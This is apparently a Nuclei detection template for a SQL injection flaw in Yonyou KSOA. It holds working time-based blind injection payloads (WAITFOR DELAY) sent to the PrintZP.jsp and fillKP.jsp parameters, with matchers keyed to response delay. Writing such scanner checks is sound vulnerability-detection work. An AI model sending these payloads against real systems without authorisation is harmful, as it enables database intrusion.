id: YongYou-KSOA-zpfbbh-sqli

info:
  name: YongYou-KSOA-zpfbbh-sqli
  author: yunkong
  severity: high
  description: 用友时空KSOA zpfbbh SQL注入漏洞
  tags: YongYou,sqli

http:
  - raw:
      - |+
        GET /kp/PrintZP.jsp?zpfbbh=1%27+IF(LEN(db_name())>4)+WAITFOR+DELAY+%270:0:5%27+--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
      - |
        GET /kp/fillKP.jsp?kp_djbh=1%27+IF(LEN(db_name())>4)+WAITFOR+DELAY+%270:0:5%27+--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
      - type: status
        status:
          - 200
